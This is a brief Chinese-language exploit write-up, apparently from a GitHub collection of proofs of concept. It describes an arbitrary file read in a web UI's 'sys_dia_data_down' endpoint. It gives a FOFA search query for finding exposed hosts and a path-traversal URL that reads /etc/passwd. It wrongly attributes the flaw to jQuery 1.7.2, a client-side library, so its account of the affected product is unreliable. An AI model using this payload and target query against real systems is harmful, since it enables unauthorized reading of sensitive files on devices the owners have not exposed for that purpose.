# 漏洞描述
jQuery-1.7.2版本的sys_dia_data_down模块存在任意文件读取漏洞，攻击者可通过前台读取任意文件。

# 影响版本
1.7.2

# fofa查询语句
body="webui/js/jquerylib/jquery-1.7.2.min.js"

# 漏洞复现
``` bash
https://127.0.0.1/webui/?g=sys_dia_data_down&file_name=../../../../../etc/passwd
```

![image](https://github.com/xxxxfang/Vulnerabilities-EXP-POC/assets/86756456/4328ff72-c011-4312-8d9e-421806046797)

![image](https://github.com/xxxxfang/Vulnerabilities-EXP-POC/assets/86756456/bed4e41b-4e7e-4383-b064-b68082413e81)


